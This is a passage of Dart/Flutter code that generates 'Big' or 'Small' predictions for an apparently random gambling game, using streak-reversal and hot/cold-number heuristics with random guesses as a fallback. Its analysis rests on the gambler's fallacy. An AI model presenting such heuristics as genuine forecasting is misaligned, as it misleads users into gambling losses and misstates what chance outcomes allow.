  }

  Future<String> _generateSingleNewPrediction() async {
    print("🎯 Generating single new prediction for sliding");

    try {
      // Fetch latest history for the new prediction
      final historyData = await _fetchCompleteGameHistory();

      if (historyData.isEmpty) {
        print("⚠️ No history for new prediction, using random");
        return Random().nextBool() ? "Big" : "Small";
      }

      // Perform quick analysis for the new prediction
      final quickAnalysis = await _performQuickAnalysis(historyData);

      // Generate prediction for the 5th position (bottom of list)
      final newPrediction =
          await _generateSinglePrediction(4, historyData, quickAnalysis);

      print("✅ Generated new sliding prediction: '$newPrediction'");
      return newPrediction;
    } catch (e) {
      print("❌ Error generating new prediction: $e");
      return Random().nextBool() ? "Big" : "Small";
    }
  }

  Future<Map<String, dynamic>> _performQuickAnalysis(
      List<Map<String, dynamic>> history) async {
    print("⚡ Performing quick analysis for sliding prediction");

    // Simplified analysis for faster sliding
    final analysis = <String, dynamic>{};

    // Quick big/small analysis
    final recentBigCount =
        history.take(5).where((h) => h['isBig'] == true).length;
    final recentBigRatio = recentBigCount / 5.0;

    analysis['bigSmallPattern'] = {
      'strength': (recentBigRatio - 0.5).abs(),
      'trend': recentBigRatio > 0.6
          ? 'big_trending'
          : recentBigRatio < 0.4
              ? 'small_trending'
              : 'neutral',
      'recentBigRatio': recentBigRatio,
      'overallBigRatio': 0.5
    };

    // Quick streak analysis
    if (history.isNotEmpty) {
      final firstResult = history.first['isBig'] as bool;
      int streakLength = 1;

      for (int i = 1; i < history.length && i < 5; i++) {
        if ((history[i]['isBig'] as bool) == firstResult) {
          streakLength++;
        } else {
          break;
        }
      }

      analysis['streakAnalysis'] = {
        'currentStreak': streakLength,
        'streakType': firstResult ? 'big' : 'small',
        'shouldReverse': streakLength >= 3
      };
    } else {
      analysis['streakAnalysis'] = {
        'currentStreak': 0,
        'streakType': 'none',
        'shouldReverse': false
      };
    }

    // Quick number frequency
    final frequency = <int, int>{};
    for (final record in history.take(10)) {
      final number = record['number'] as int;
      frequency[number] = (frequency[number] ?? 0) + 1;
    }

    final sortedFreq = frequency.entries.toList()
      ..sort((a, b) => b.value.compareTo(a.value));

    analysis['numberFrequency'] = {
      'hotNumbers': sortedFreq.take(3).map((e) => e.key).toList(),
      'coldNumbers': sortedFreq.reversed.take(3).map((e) => e.key).toList(),
      'frequency': frequency,
    };

    // Quick sequence pattern
    analysis['sequencePattern'] = {'type': 'random', 'confidence': 0.3};

    // Quick time pattern
    analysis['timePattern'] = {'trend': 'neutral'};

    // Quick color pattern
    analysis['colorPattern'] = {'dominantPattern': 'unknown'};

    return analysis;
  }
}

extension on WebViewController {
  void addJavaScriptHandler({
    required String handlerName,
    required Null Function(dynamic args) callback,
  }) {}
}
